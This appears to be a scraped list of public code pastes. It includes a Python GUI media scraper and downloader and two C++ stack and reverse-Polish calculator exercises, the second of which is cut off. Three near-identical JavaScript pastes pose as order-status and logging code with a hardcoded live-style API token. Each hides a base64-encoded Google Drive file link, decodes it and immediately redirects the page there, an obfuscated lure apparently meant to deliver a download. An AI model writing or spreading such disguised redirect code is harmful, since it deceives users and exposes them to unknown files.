p3Ak4aqv,Untitled,dentira,JavaScript,Thursday 17th of April 2025 07:47:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26186/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zTsKFLES,SCRAPE-URLS-DOWNLOAD.pyw,Najeebsk,Python,Thursday 17th of April 2025 07:37:22 AM CDT,"import os
import requests
from bs4 import BeautifulSoup
from tkinter import *
from tkinter import messagebox, filedialog
from urllib.parse import urljoin, urlparse
import yt_dlp
import subprocess
from PIL import Image, ImageTk
import io
import threading

stop_download_flag = False
#================ADD-IMAGE-ICON=================
import sys

def resource_path(relative_path):
    """""" Get the absolute path to the resource, works for PyInstaller. """"""
    if getattr(sys, '_MEIPASS', False):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("".""), relative_path)

# Use this function to load files:
#splash_image = resource_path(""splash-1.png"")
icon_path = resource_path(""D.ico"")
#================ADD-IMAGE-ICON=================
media_urls = []

special_sites = ['youtube.com', 'youtu.be', 'facebook.com', 'fb.watch', 'tiktok.com', 'instagram.com']
image_exts = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg', '.ico']
video_exts = ['.mp4', '.webm', '.ogg', '.mov', '.avi', '.mkv', '.flv', '.3gp', '.wmv', '.m3u', '.m3u8']

def is_special_site(url):
    return any(domain in url for domain in special_sites)

def browse_url_file():
    file_path = filedialog.askopenfilename(title=""Open URL File"", filetypes=[(""Text files"", ""*.txt"")])
    if file_path:
        with open(file_path, 'r') as f:
            for line in f:
                url = line.strip()
                if url and url not in media_urls:
                    media_urls.append(url)
                    result_box.insert(END, url + ""\n"")

def save_urls_to_file():
    file_path = filedialog.asksaveasfilename(defaultextension="".txt"", filetypes=[(""Text files"", ""*.txt"")])
    if file_path:
        with open(file_path, 'w') as f:
            f.write(result_box.get(""1.0"", END).strip())
        messagebox.showinfo(""Saved"", f""URLs saved to {file_path}"")

def scrape_normal_site(url):
    found_urls = set()
    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            return found_urls

        soup = BeautifulSoup(response.text, 'html.parser')
        for tag in soup.find_all(['img', 'video', 'source', 'a']):
            src = tag.get('src') or tag.get('href')
            if src:
                full_url = urljoin(url, src)
                parsed = urlparse(full_url)
                ext = os.path.splitext(parsed.path)[1].lower()
                if ext in image_exts + video_exts:
                    found_urls.add(full_url)
    except Exception:
        pass
    return found_urls

def process_url():
    url = url_entry.get().strip()
    if not url:
        messagebox.showwarning(""Input Error"", ""Please enter a valid URL."")
        return

    media_urls.clear()
    result_box.delete(""1.0"", END)

    try:
        if is_special_site(url):
            ydl_opts = {
                'quiet': True,
                'skip_download': True,
                'force_generic_extractor': False
            }
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(url, download=False)
                if 'entries' in info:
                    for entry in info['entries']:
                        media_urls.append(entry['webpage_url'])
                        result_box.insert(END, entry['webpage_url'] + ""\n"")
                else:
                    media_urls.append(info['webpage_url'])
                    result_box.insert(END, info['webpage_url'] + ""\n"")
        else:
            scraped = scrape_normal_site(url)
            media_urls.extend(scraped)
            for media_url in scraped:
                result_box.insert(END, media_url + ""\n"")

        if not media_urls:
            messagebox.showinfo(""Info"", ""No media URLs found."")
        else:
            messagebox.showinfo(""Success"", f""{len(media_urls)} media URL(s) found!"")

    except Exception as e:
        messagebox.showerror(""Error"", str(e))

def download_media(url, save_path):
    try:
        if is_special_site(url):
            ytdlp_path = r""C:\Windows\yt-dlp.exe""  # Replace if needed
            command = [
                ytdlp_path,
                ""-f"", ""best"",
                ""--no-playlist"",
                ""--extractor-args"", ""youtube:player_client=web"",
                ""-o"", save_path,
                url
            ]
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode != 0:
                raise Exception(result.stderr.strip())
        else:
            response = requests.get(url, stream=True)
            if response.status_code == 200:
                with open(save_path, 'wb') as f:
                    for chunk in response.iter_content(1024):
                        f.write(chunk)
    except Exception as e:
        messagebox.showerror(""Download Error"", f""Failed to download:\n{url}\n\n{str(e)}"")

def download_selected_line():
    try:
        line_index = result_box.index(INSERT).split(""."")[0]
        selected_url = result_box.get(f""{line_index}.0"", f""{line_index}.end"").strip()
        if not selected_url:
            raise Exception(""No line selected."")

        folder = filedialog.askdirectory(title=""Select Folder to Save File"")
        if not folder:
            return

        parsed = urlparse(selected_url)
        filename = os.path.basename(parsed.path)
        if not filename:
            filename = ""downloaded_file""

        save_path = os.path.join(folder, filename)
        threading.Thread(target=threaded_download, args=(selected_url, save_path), daemon=True).start()

    except Exception as e:
        messagebox.showerror(""Error"", str(e))

def download_selected():
    selected_urls = result_box.get(""1.0"", END).strip().splitlines()
    if not selected_urls:
        messagebox.showwarning(""Selection Error"", ""No URLs to download."")
        return

    selected = filedialog.askdirectory(title=""Select Folder to Save Files"")
    if not selected:
        return

    for url in selected_urls:
        parsed = urlparse(url)
        filename = os.path.basename(parsed.path)
        if not filename:
            filename = ""downloaded_file.mp4""

        save_path = os.path.join(selected, filename)
        download_media(url, save_path)

    messagebox.showinfo(""Download Complete"", f""Downloaded {len(selected_urls)} media files."")

from threading import Thread
stop_flag = False

def fix_partial_video(input_path):
    try:
        if not os.path.exists(input_path) or not input_path.lower().endswith("".mp4""):
            return
        output_path = input_path.replace("".mp4"", ""_fixed.mp4"")

        ffmpeg_path = r""C:\Program Files\ffmpeg\bin\ffmpeg.exe""  # ✅ Your FFmpeg location here

        # Try quick remux
        command = [
            ffmpeg_path,
            ""-y"",
            ""-i"", input_path,
            ""-c"", ""copy"",
            ""-movflags"", ""+faststart"",
            output_path
        ]
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Fallback to re-encode if remux fails or small file
        if result.returncode != 0 or not os.path.exists(output_path) or os.path.getsize(output_path) < 1024 * 1024:
            print(""[INFO] Remux failed or file too small, retrying with re-encode..."")
            command = [
                ffmpeg_path,
                ""-y"",
                ""-i"", input_path,
                ""-preset"", ""ultrafast"",
                output_path
            ]
            subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Replace original file if fixed
        if os.path.exists(output_path):
            os.remove(input_path)
            os.rename(output_path, input_path)

    except Exception as e:
        print(f""[FFmpeg Fix Error] {e}"")
        
def threaded_download(url, save_path):
    global stop_download_flag
    stop_download_flag = False
    try:
        if is_special_site(url):
            ytdlp_path = r""C:\Windows\yt-dlp.exe""  # ✅ Ensure correct path
            command = [
                ytdlp_path,
                ""-f"", ""mp4"",
                ""--no-part"",  # Saves directly as .mp4
                ""--downloader"", ""ffmpeg"",
                ""--downloader-args"", ""ffmpeg_i:-movflags +faststart"",
                ""-o"", save_path,
                url
            ]
            proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            while proc.poll() is None:
                if stop_download_flag:
                    proc.kill()
                    break

        else:
            response = requests.get(url, stream=True, timeout=10)
            if response.status_code == 200:
                with open(save_path, 'wb') as f:
                    for chunk in response.iter_content(1024 * 1024):  # 1MB
                        if stop_download_flag:
                            break
                        if chunk:
                            f.write(chunk)

        if stop_download_flag:
            fix_partial_video(save_path)  # Try to repair it
            messagebox.showinfo(""Download Stopped"", f""Download was stopped by user.\nSaved: {save_path}"")
        else:
            messagebox.showinfo(""Download Complete"", f""Downloaded successfully to:\n{save_path}"")

    except Exception as e:
        messagebox.showerror(""Download Error"", str(e))

def start_download(url, save_path):
    global stop_flag
    stop_flag = False
    Thread(target=threaded_download, args=(url, save_path)).start()

def stop_download():
    global stop_download_flag
    stop_download_flag = True

def scrape_all_links(url):
    all_links = set()
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        for a_tag in soup.find_all('a', href=True):
            full_url = urljoin(url, a_tag['href'])
            all_links.add(full_url)
    except Exception as e:
        print(f""[Scrape All Error] {e}"")
    return all_links

def scrape_all_button():
    url = url_entry.get().strip()
    if not url:
        messagebox.showwarning(""Input Error"", ""Please enter a valid URL."")
        return

    result_box.delete(""1.0"", END)
    media_urls.clear()
    all_links = scrape_all_links(url)
    media_urls.extend(all_links)
    for link in all_links:
        result_box.insert(END, link + ""\n"")
    messagebox.showinfo(""Done"", f""{len(all_links)} total link(s) scraped."")

def open_in_vlc():
    line_index = result_box.index(INSERT).split(""."")[0]
    selected_url = result_box.get(f""{line_index}.0"", f""{line_index}.end"").strip()
    if not selected_url:
        messagebox.showwarning(""No Selection"", ""Select a valid media URL."")
        return

    vlc_path = r""C:\Program Files\VideoLAN\VLC\vlc.exe""
    try:
        subprocess.Popen([vlc_path, selected_url])
    except Exception as e:
        messagebox.showerror(""VLC Error"", f""Could not open VLC:\n{e}"")    
def preview_image_popup():
    try:
        line_index = result_box.index(INSERT).split(""."")[0]
        selected_url = result_box.get(f""{line_index}.0"", f""{line_index}.end"").strip()
        if not selected_url.lower().endswith(tuple(image_exts)):
            raise Exception(""Selected link is not an image."")

        response = requests.get(selected_url, timeout=10)
        image = Image.open(io.BytesIO(response.content))

        popup = Toplevel(root)
        popup.title(""Image Preview"")
        popup.geometry(""600x600"")

        img_resized = image.resize((500, 500), Image.ANTIALIAS)
        img_tk = ImageTk.PhotoImage(img_resized)

        label = Label(popup, image=img_tk)
        label.image = img_tk
        label.pack()

    except Exception as e:
        messagebox.showerror(""Preview Error"", str(e))
def clear_url_field():
    url_entry.delete(0, END)

def clear_result_box():
    result_box.delete(""1.0"", END)
    media_urls.clear()

def load_m3u_file():
    file_path = filedialog.askopenfilename(title=""Open M3U File"", filetypes=[(""M3U/M3U8 Files"", ""*.m3u *.m3u8"")])
    if file_path:
        result_box.delete(""1.0"", END)
        media_urls.clear()
        with open(file_path, 'r', encoding=""utf-8"", errors=""ignore"") as f:
            for line in f:
                url = line.strip()
                if url and url.startswith(""http""):
                    media_urls.append(url)
                    result_box.insert(END, url + ""\n"")
        messagebox.showinfo(""Loaded"", f""{len(media_urls)} media URLs loaded from playlist."")

def load_online_m3u():
    url = url_entry.get().strip()
    if not url.lower().endswith(("".m3u"", "".m3u8"")):
        messagebox.showwarning(""URL Error"", ""Please enter a valid .m3u or .m3u8 URL."")
        return

    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            raise Exception(""Unable to fetch playlist."")

        result_box.delete(""1.0"", END)
        media_urls.clear()

        for line in response.text.splitlines():
            line = line.strip()
            if line and line.startswith(""http""):
                media_urls.append(line)
                result_box.insert(END, line + ""\n"")

        messagebox.showinfo(""Online M3U Loaded"", f""{len(media_urls)} stream(s) loaded."")

    except Exception as e:
        messagebox.showerror(""Error"", str(e))

def save_as_m3u():
    file_path = filedialog.asksaveasfilename(defaultextension="".m3u"", filetypes=[(""Text File"", ""*.txt""), (""M3U Playlist"", ""*.m3u""), (""M3U8 Playlist"", ""*.m3u8"")])
    if file_path:
        with open(file_path, 'w', encoding=""utf-8"") as f:
            f.write(result_box.get(""1.0"", END).strip())
        messagebox.showinfo(""Saved"", f""Playlist saved to:\n{file_path}"")        

def scrape_xtream_m3u_url():
    url = url_entry.get().strip()
    if not url or ""get.php"" not in url:
        messagebox.showwarning(""Input Error"", ""Please enter a valid Xtream M3U URL."")
        return

    try:
        headers = {
            ""User-Agent"": ""VLC/3.0.18 LibVLC/3.0.18""
        }
        response = requests.get(url, headers=headers, timeout=15)

        if response.status_code == 404:
            raise Exception(""404 Not Found — the playlist URL might be wrong or expired."")
        if response.status_code != 200:
            raise Exception(f""Failed to fetch playlist. Status code: {response.status_code}"")

        content = response.text
        if ""#EXTM3U"" not in content:
            raise Exception(""Invalid playlist. No M3U content found."")

        result_box.delete(""1.0"", END)
        media_urls.clear()

        for line in content.splitlines():
            if line.startswith(""http""):
                media_urls.append(line)
                result_box.insert(END, line + ""\n"")

        if media_urls:
            messagebox.showinfo(""Success"", f""Scraped {len(media_urls)} stream URLs from Xtream playlist."")
        else:
            messagebox.showwarning(""No URLs"", ""Playlist loaded, but no stream URLs found."")

    except Exception as e:
        messagebox.showerror(""Error"", str(e))
def search_urls():
    query = search_entry.get().strip().lower()
    if not query:
        return
    result_box.tag_remove(""highlight"", ""1.0"", END)
    
    lines = result_box.get(""1.0"", END).splitlines()
    for i, line in enumerate(lines, 1):
        if query in line.lower():
            result_box.tag_add(""highlight"", f""{i}.0"", f""{i}.end"")

    result_box.tag_config(""highlight"", background=""yellow"", foreground=""black"")

def clear_search():
    search_entry.delete(0, END)
    result_box.tag_remove(""highlight"", ""1.0"", END)

def scrape_directory_media(url):
    """"""
    Scrape media URLs from subdirectories of the given URL.
    :param url: The base URL to start scraping from.
    """"""
    global media_urls
    result_box.delete(""1.0"", END)
    media_urls.clear()

    def extract_directories(soup, base_url):
        """"""
        Extract directory links from the page.
        :param soup: BeautifulSoup object of the page.
        :param base_url: Base URL to resolve relative paths.
        :return: List of directory URLs.
        """"""
        directories = []
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            if href.endswith(""/"") and not href.startswith(""#""):  # Subdirectory link
                full_href = urljoin(base_url, href)
                if full_href != base_url:  # Avoid infinite loops
                    directories.append(full_href)
        return directories

    def extract_media_urls(soup, base_url):
        """"""
        Extract media URLs from the page.
        :param soup: BeautifulSoup object of the page.
        :param base_url: Base URL to resolve relative paths.
        :return: Set of media URLs.
        """"""
        media_links = set()
        for tag in soup.find_all(['img', 'video', 'source', 'a']):
            src = tag.get('src') or tag.get('href')
            if src:
                full_url = urljoin(base_url, src)
                parsed = urlparse(full_url)
                ext = os.path.splitext(parsed.path)[1].lower()
                if ext in image_exts + video_exts:
                    media_links.add(full_url)
        return media_links

    try:
        # Fetch the base URL content
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            messagebox.showerror(""Error"", f""Failed to fetch {url} (Status Code: {response.status_code})"")
            return

        soup = BeautifulSoup(response.text, 'html.parser')

        # Step 1: Extract all subdirectories
        directories = extract_directories(soup, url)

        # Step 2: Scrape media URLs from each subdirectory
        found_media = False
        for directory in directories:
            try:
                dir_response = requests.get(directory, timeout=10)
                if dir_response.status_code == 200:
                    dir_soup = BeautifulSoup(dir_response.text, 'html.parser')
                    media_links = extract_media_urls(dir_soup, directory)
                    if media_links:
                        found_media = True
                        for media_url in media_links:
                            if media_url not in media_urls:
                                media_urls.append(media_url)
                                result_box.insert(END, media_url + ""\n"")
            except Exception as e:
                print(f""Error scraping directory {directory}: {e}"")

        if not found_media:
            messagebox.showinfo(""Info"", ""No media URLs found in subdirectories."")
        else:
            messagebox.showinfo(""Success"", f""{len(media_urls)} media URL(s) found!"")

    except Exception as e:
        messagebox.showerror(""Error"", str(e))
    
# GUI Setup
root = Tk()
root.title(""Najeeb Scrape Media Downloader + Batch Support"")
root.geometry(""965x700"")
#root.configure(bg=""#2c3e50"")
root.iconbitmap(icon_path)

Label(root, text=""Najeeb Downloader Enter URL Picture And Video(any site or platform):"").pack(pady=5)
search_frame = Frame(root)
search_frame.pack(pady=5)

search_entry = Entry(search_frame, width=40)
search_entry.pack(side=LEFT, padx=5)
Button(search_frame, text=""Search"", command=search_urls, bg=""lightblue"").pack(side=LEFT, padx=5)
url_entry = Entry(search_frame, width=100)
url_entry.pack(pady=5)

frame_buttons = Frame(root)
frame_buttons.pack(pady=5)

Button(frame_buttons, text=""Scrape Media"", command=process_url, bg=""lightgreen"", width=20).pack(side=LEFT, padx=5)
Button(frame_buttons, text=""Browse URL File"", command=browse_url_file, bg=""lightyellow"", width=20).pack(side=LEFT, padx=5)
Button(frame_buttons, text=""Download All URLs"", command=download_selected, bg=""lightblue"", width=20).pack(side=LEFT, padx=5)
Button(frame_buttons, text=""Download Selected URL"", command=download_selected_line, bg=""orange"", width=20).pack(side=LEFT, padx=5)
Button(frame_buttons, text=""Save URLs to File"", command=save_urls_to_file, bg=""lightgray"", width=20).pack(side=LEFT, padx=5)
Button(frame_buttons, text=""Stop Download"", command=lambda: stop_download(), bg=""red"", width=20).pack(side=LEFT, padx=5)

frame_button = Frame(root)
frame_button.pack(pady=5)

Button(frame_button, text=""Scrape All Links"", command=scrape_all_button, bg=""#e0c3fc"", width=20).pack(side=LEFT, padx=5)
Button(frame_button, text=""Open in VLC"", command=open_in_vlc, bg=""#c1f0c1"", width=20).pack(side=LEFT, padx=5)
Button(frame_button, text=""Preview Image"", command=preview_image_popup, bg=""#f0c1c1"", width=20).pack(side=LEFT, padx=5)
Button(frame_button, text=""Load Online M3U"", command=load_online_m3u, bg=""#c9f2ff"", width=20).pack(side=LEFT, padx=5)
Button(frame_button, text=""Scrape Xtream M3U"", command=scrape_xtream_m3u_url, bg=""#fff0b3"", width=20).pack(side=LEFT, padx=5)
Button(frame_button, text=""Load M3U File"", command=load_m3u_file, bg=""#d0f0fd"", width=20).pack(side=LEFT, padx=5)


#Label(root, text=""Editable Media URL List:"").pack(pady=10)
result_frame = Frame(root)
result_frame.pack(pady=5)

scrollbar = Scrollbar(result_frame)
scrollbar.pack(side=RIGHT, fill=Y)

result_box = Text(result_frame, height=28, width=124, yscrollcommand=scrollbar.set)
result_box.pack(side=LEFT, fill=BOTH)

scrollbar.config(command=result_box.yview)

frame_clear = Frame(root)
frame_clear.pack(pady=5)

Button(frame_clear, text=""Save Result"", command=save_as_m3u, bg=""#a7ffcc"", width=20).pack(side=LEFT, padx=5)
Button(frame_clear, text=""Clear Search"", command=clear_search, bg=""lightgray"").pack(side=LEFT, padx=2)
Button(frame_clear, text=""Clear URL Field"", command=clear_url_field, bg=""#ffd580"", width=20).pack(side=LEFT, padx=5)
Button(frame_clear, text=""Clear Result Field"", command=clear_result_box, bg=""#ffb3b3"", width=20).pack(side=LEFT, padx=5)
# Add a button for scraping subdirectories
Button(frame_clear, text=""Scrape Subdirectories"", command=lambda: scrape_directory_media(url_entry.get().strip()), bg=""#ffcccb"", width=20).pack(side=LEFT, padx=5) 

root.mainloop()
"
NJB20QtR,Products.js,dentira,JavaScript,Thursday 17th of April 2025 07:32:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45486/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GnWPM0ba,Order.js,dentira,JavaScript,Thursday 17th of April 2025 07:16:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/59925/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TQHPX4RD,Untitled,Mikhail-Podbolotov,C++,Thursday 17th of April 2025 07:09:42 AM CDT,"#include <iostream>
#include <string>

// ===== Stack =====
template <typename T>
class Stack {
private:
    struct Node {
        T data;
        Node* next;
        Node(const T& value, Node* nextNode = nullptr)
            : data(value), next(nextNode) {
        }
    };

    Node* topNode;

public:
    Stack() : topNode(nullptr) {}

    ~Stack() {
        while (!isEmpty()) {
            pop();
        }
    }

    void push(const T& value) {
        topNode = new Node(value, topNode);
    }

    void pop() {
        if (isEmpty()) {
            std::cerr << ""Error: Stack is empty, cannot pop.\n"";
            return;
        }
        Node* temp = topNode;
        topNode = topNode->next;
        delete temp;
    }

    T& top() {
        if (isEmpty()) {
            std::cerr << ""Error: Stack is empty.\n"";
            std::exit(1);
        }
        return topNode->data;
    }

    bool isEmpty() const {
        return topNode == nullptr;
    }
};

// ===== Utils =====
bool isNumber(const std::string& s) {
    if (s.empty()) return false;
    size_t start = 0;
    if (s[0] == '-' && s.size() > 1) start = 1;
    for (size_t i = start; i < s.size(); ++i)
        if (s[i] < '0' || s[i] > '9') return false;
    return true;
}

int toInt(const std::string& s) {
    int result = 0;
    bool negative = false;
    size_t i = 0;
    if (s[0] == '-') { negative = true; i = 1; }
    for (; i < s.size(); ++i) result = result * 10 + (s[i] - '0');
    return negative ? -result : result;
}

// ===== RPN Evaluation =====
int evaluateRPN(const std::string& input) {
    Stack<int> stack;
    std::string token = """";

    for (size_t i = 0; i <= input.length(); ++i) {
        char ch = (i < input.length()) ? input[i] : ' ';

        if (ch != ' ') {
            token += ch;
        }
        else if (!token.empty()) {
            if (isNumber(token)) {
                stack.push(toInt(token));
            }
            else if (token == ""+"" || token == ""-"" || token == ""*"" || token == ""/"") {
                if (stack.isEmpty()) return -999999; // Error code
                int b = stack.top(); stack.pop();
                if (stack.isEmpty()) return -999999;
                int a = stack.top(); stack.pop();

                if (token == ""+"") stack.push(a + b);
                else if (token == ""-"") stack.push(a - b);
                else if (token == ""*"") stack.push(a * b);
                else if (token == ""/"") {
                    if (b == 0) return -888888; // Деление на 0
                    stack.push(a / b);
                }
            }
            else {
                std::cerr << ""Unknown token: "" << token << ""\n"";
                return -777777; // Некорректный токен
            }
            token = """";
        }
    }

    if (!stack.isEmpty()) {
        int result = stack.top(); stack.pop();
        if (!stack.isEmpty()) return -666666; // Stack not empty at end — ошибка
        return result;
    }

    return -555555; // Пустой ввод
}

// ===== Stack Test =====
void testStack() {
    std::cout << ""[Stack Test]\n"";
    Stack<int> s;
    s.push(1);
    s.push(2);
    s.push(3);

    if (s.top() == 3) std::cout << ""Top OK\n"";
    else std::cout << ""Top FAIL\n"";

    s.pop();
    if (s.top() == 2) std::cout << ""Pop OK\n"";
    else std::cout << ""Pop FAIL\n"";

    s.pop(); s.pop();
    if (s.isEmpty()) std::cout << ""Empty OK\n"";
    else std::cout << ""Empty FAIL\n"";

    std::cout << ""\n"";
}

// ===== RPN Test =====
void testRPN() {
    std::cout << ""[RPN Test]\n"";

    struct TestCase {
        std::string expr;
        int expected;
    };

    TestCase cases[] = {
        {""3 4 +"", 7},
        {""10 2 * 3 +"", 23},
        {""15 7 1 1 + - / 3 * 2 1 1 + + -"", 5},
        {""5 1 2 + 4 * + 3 -"", 14},
        {""3 0 /"", -888888},  // деление на 0
        {""5 +"", -999999},    // недостаточно операндов
        {""1 2 3 +"", -666666} // лишнее на стеке
    };

    for (int i = 0; i < sizeof(cases) / sizeof(TestCase); ++i) {
        int result = evaluateRPN(cases[i].expr);
        std::cout << ""Test "" << i + 1 << "": "";
        if (result == cases[i].expected)
            std::cout << ""OK"";
        else
            std::cout << ""FAIL (got "" << result << "", expected "" << cases[i].expected << "")"";
        std::cout << ""\n"";
    }

    std::cout << ""\n"";
}

// ===== Main =====
int main() {
    testStack();
    testRPN();

    std::string input;
    std::cout << ""Enter RPN expression (e.g. '3 4 + 2 *'): "";
    std::getline(std::cin, input);

    int result = evaluateRPN(input);
    std::cout << ""Result: "" << result << ""\n"";

    return 0;
}
"
Yj44gVzs,Untitled,Mikhail-Podbolotov,C++,Thursday 17th of April 2025 07:06:33 AM CDT,"//// deepseek 
#include <iostream>

// Шаблонный класс Stack
template <typename T>
class Stack {
private:
    struct Node {
        T data;
        Node* next;
        Node(const T& data, Node* next = nullptr) : data(data), next(next) {}
    };

    Node* topNode;
    size_t stackSize;

public:
    Stack() : topNode(nullptr), stackSize(0) {}

    ~Stack() {
        while (!empty()) {
            pop();
        }
    }

    void push(const T& value) {
        Node* newNode = new Node(value, topNode);
        topNode = newNode;
        stackSize++;
    }

    void pop() {
        if (empty()) {
            std::cerr << ""Error: Stack is empty, cannot pop\n"";
            return;
        }

        Node* temp = topNode;
        topNode = topNode->next;
        delete temp;
        stackSize--;
    }

    T& top() {
        if (empty()) {
            std::cerr << ""Error: Stack is empty, returning garbage value\n"";
            static T garbage;
            return garbage;
        }
        return topNode->data;
    }

    const T& top() const {
        if (empty()) {
            std::cerr << ""Error: Stack is empty, returning garbage value\n"";
            static T garbage;
            return garbage;
        }
        return topNode->data;
    }

    bool empty() const {
        return topNode == nullptr;
    }

    size_t size() const {
        return stackSize;
    }
};

// Вспомогательные функции для калькулятора
bool isDigit(char c) {
    return c >= '0' && c <= '9';
}

double parseNumber(const char*& str) {
    double num = 0;
    bool negative = false;
    bool decimal = false;
    double decimalDivisor = 1.0;

    if (*str == '-') {
        negative = true;
        ++str;
    }

    while (isDigit(*str) || *str == '.') {
        if (*str == '.') {
            decimal = true;
            ++str;
            continue;
        }

        if (decimal) {
            decimalDivisor *= 10;
            num += (*str - '0') / decimalDivisor;
        }
        else {
            num = num * 10 + (*str - '0');
        }
        ++str;
    }

    return negative ? -num : num;
}

// Функция вычисления выражения в ОПН
double evaluateRPN(const char* expression) {
    Stack<double> stack;

    while (*expression != '\0') {
        // Пропускаем пробелы
        if (*expression == ' ') {
            ++expression;
            continue;
        }

        // Если цифра или минус (начало числа)
        if (isDigit(*expression) || (*expression == '-' && isDigit(*(expression + 1)))) {
            stack.push(parseNumber(expression));
        }
        else {
            // Операция
            if (stack.size() < 2) {
                std::cerr << ""Error: Not enough operands for operation\n"";
                return 0;
            }

            double b = stack.top(); stack.pop();
            double a = stack.top(); stack.pop();

            switch (*expression) {
            case '+': stack.push(a + b); break;
            case '-': stack.push(a - b); break;
            case '*': stack.push(a * b); break;
            case '/':
                if (b == 0) {
                    std::cerr << ""Error: Division by zero\n"";
                    return 0;
                }
                stack.push(a / b);
                break;
            default:
                std::cerr << ""Error: Unknown operator '"" << *expression << ""'\n"";
                return 0;
            }
            ++expression;
        }
    }

    if (stack.size() != 1) {
        std::cerr << ""Error: Invalid expression format\n"";
        return 0;
    }

    return stack.top();
}

// Тестирование стека
void testStack() {
    std::cout << ""=== Testing Stack ===\n"";
    Stack<int> s;

    s.push(1);
    s.push(2);
    s.push(3);

    std::cout << ""Top: "" << s.top() << "" (expected 3)\n"";
    s.pop();
    std::cout << ""Top after pop: "" << s.top() << "" (expected 2)\n"";
    std::cout << ""Size: "" << s.size() << "" (expected 2)\n"";
    std::cout << ""Empty: "" << (s.empty() ? ""true"" : ""false"") << "" (expected false)\n"";

    s.pop();
    s.pop();
    std::cout << ""Empty after pops: "" << (s.empty() ? ""true"" : ""false"") << "" (expected true)\n"";

    // Тест на пустом стеке
    s.top(); // Должно вывести ошибку
    s.pop(); // Должно вывести ошибку
}

// Тестирование калькулятора
void testCalculator() {
    std::cout << ""\n=== Testing RPN Calculator ===\n"";

    const char* test1 = ""3 4 +""; // 3 + 4 = 7
    const char* test2 = ""5 1 2 + 4 * +""; // 5 + (1 + 2) * 4 = 17
    const char* test3 = ""10 6 - 2 /""; // (10 - 6) / 2 = 2
    const char* test4 = ""3.5 2 *""; // 3.5 * 2 = 7
    const char* test5 = ""-5 3 +""; // -5 + 3 = -2

    std::cout << test1 << "" = "" << evaluateRPN(test1) << "" (expected 7)\n"";
    std::cout << test2 << "" = "" << evaluateRPN(test2) << "" (expected 17)\n"";
    std::cout << test3 << "" = "" << evaluateRPN(test3) << "" (expected 2)\n"";
    std::cout << test4 << "" = "" << evaluateRPN(test4) << "" (expected 7)\n"";
    std::cout << test5 << "" = "" << evaluateRPN(test5) << "" (expected -2)\n"";

    // Тест ошибок
    std::cout << ""\nTesting errors:\n"";
    evaluateRPN(""1 2 + +""); // Недостаточно операндов
    evaluateRPN(""1 0 /"");   // Деление на ноль
